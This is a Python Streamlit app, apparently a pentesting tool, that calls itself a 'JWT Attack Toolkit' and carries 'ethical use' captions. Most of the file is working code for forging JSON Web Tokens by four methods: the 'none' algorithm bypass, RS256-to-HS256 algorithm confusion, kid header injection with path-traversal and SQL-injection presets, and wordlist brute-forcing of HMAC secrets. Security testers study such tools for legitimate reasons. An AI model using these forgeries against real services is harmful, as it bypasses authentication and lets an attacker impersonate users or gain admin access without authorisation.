import streamlit as st
import json
import base64
import hmac
import hashlib

# ─── UTILS ───────────────────────────────────

def b64_decode_padding(data: str) -> bytes:
    """Decodes base64url and adds necessary padding."""
    padding = 4 - len(data) % 4
    if padding < 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

def decode_token_parts(token: str):
    """Splits and decodes the JWT parts."""
    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None, None, None
        header = json.loads(b64_decode_padding(parts[0]))
        payload = json.loads(b64_decode_padding(parts[1]))
        return header, payload, parts
    except Exception:
        return None, None, None

# ─── PAGE CONFIG ─────────────────────────────

st.set_page_config(page_title="JWT Attack Toolkit", page_icon="🛡️")
st.title("🛡️ JWT Attack Toolkit")
st.markdown("### Ethical Use Only")

# ─── SIDEBAR ─────────────────────────────────

st.sidebar.header("Configuration")
target_token = st.sidebar.text_area("Paste Target JWT Token here:", height=120)
attack_type = st.sidebar.selectbox("Select Attack Vector", [
    "Token Info",
    "None Algorithm",
    "Algorithm Confusion",
    "KID Injection",
    "Brute-Force Secret"
])

# Variables initialization
kid_val = None
pub_key_bytes = None
wordlist_text = None

if attack_type == "KID Injection":
    st.subheader("⚡ KID Injection — Configuration")
    kid_val = st.text_input("KID Payload", value="../../dev/null")
    st.markdown("**Quick presets:**")
    c1, c2, c3 = st.columns(3)
    if c1.button("../../dev/null"):
        kid_val = "../../dev/null"
    if c2.button("SQLi payload"):
        kid_val = "x' UNION SELECT 'secret'-- -"
    if c3.button("/dev/stdin"):
        kid_val = "/dev/stdin"

elif attack_type == "Algorithm Confusion":
    st.subheader("⚡ Algorithm Confusion — Configuration")
    uploaded = st.file_uploader("Upload RSA Public Key (.pem / .txt)", type=["pem", "txt", "key"])
    if uploaded:
        pub_key_bytes = uploaded.read()
        st.success(f"Key loaded: `{uploaded.name}`")
    else:
        st.warning("Upload the server's RSA public key. Usually found at `/.well-known/jwks.json`.")

elif attack_type == "Brute-Force Secret":
    st.subheader("⚡ Brute-Force — Configuration")
    default_words = "secret\npassword\n123456\nadmin\ntest\njwt\nhello\nqwerty\ntoken\nsecret123\njwtsecret"
    wordlist_text = st.text_area("Wordlist (one secret per line):", value=default_words, height=150)

# ─── LAUNCH BUTTON ───────────────────────────

st.divider()

if st.button("🚀 Launch Attack", type="primary"):
    if not target_token:
        st.error("Paste a JWT token in the sidebar first!")
        st.stop()

    header, payload, parts = decode_token_parts(target_token)
    if not header:
        st.error("Invalid JWT format! Make sure it has 3 parts separated by dots.")
        st.stop()

    # ── Token Info ──────────────────────────
    if attack_type == "Token Info":
        st.subheader("🔍 Decoded Token")
        col1, col2 = st.columns(2)
        with col1:
            st.markdown("**Header**")
            st.json(header)
        with col2:
            st.markdown("**Payload**")
            st.json(payload)
        st.caption(f"Algorithm: `{header.get('alg')}` | Signature: `{parts[2][:30]}...`")

    # ── None Algorithm ──────────────────────
    elif attack_type == "None Algorithm":
        st.subheader("⚡ None Algorithm Bypass")
        header["alg"] = "none"
        new_h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()

        forged_with = new_h + "." + parts[1] + "."
        forged_without = new_h + "." + parts[1]

        st.success("✅ Forged tokens generated!")
        st.markdown("**How it works:** `alg: none` tells vulnerable libraries to skip signature verification.")
        st.markdown("**With trailing dot:**")
        st.code(forged_with, language="text")
        st.markdown("**Without trailing dot:**")
        st.code(forged_without, language="text")

    # ── Algorithm Confusion ─────────────────
    elif attack_type == "Algorithm Confusion":
        if not pub_key_bytes:
            st.error("Please upload the RSA public key first.")
            st.stop()

        header["alg"] = "HS256"
        new_h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()
        new_p = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()

        signing_input = new_h + "." + new_p
        sig = hmac.new(pub_key_bytes, signing_input.encode(), hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        forged_token = signing_input + "." + sig_enc

        st.success("✅ Algorithm confusion token forged!")
        st.code(forged_token, language="text")

    # ── KID Injection ───────────────────────
    elif attack_type == "KID Injection":
        header["kid"] = kid_val
        header["alg"] = "HS256"

        new_h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()

        signing_input = new_h + "." + parts[1]
        # Sign with an empty secret as /dev/null/ is empty
        sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        forged_token = signing_input + "." + sig_enc

        st.success("✅ KID Injection token forged!")
        st.code(forged_token, language="text")

    # ── Brute-Force ─────────────────────────
    elif attack_type == "Brute-Force Secret":
        alg = header.get("alg", "").upper()
        if not alg.startswith("HS"):
            st.error(f"Brute-force only works on HS algorithms. Token uses `{alg}`.")
            st.stop()

        secrets = [l.strip() for l in wordlist_text.splitlines() if l.strip()]
        signing_input = parts[0] + "." + parts[1]
        orig_sig = b64_decode_padding(parts[2])
        
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn = hash_map.get(alg, hashlib.sha256)

        st.info(f"Testing {len(secrets)} secrets...")
        bar = st.progress(0)
        found = None

        for i, secret in enumerate(secrets):
            test_sig = hmac.new(secret.encode(), signing_input.encode(), hash_fn).digest()
            if hmac.compare_digest(test_sig, orig_sig):
                found = secret
                break
            bar.progress((i + 1) / len(secrets))

        bar.empty()
        if found:
            st.success(f"🔓 SECRET CRACKED: `{found}`")
        else:
            st.warning("Secret not found in wordlist.")

st.divider()
st.caption("Built by Suhani Bharti | JWT Attack Toolkit | Authorized testing only")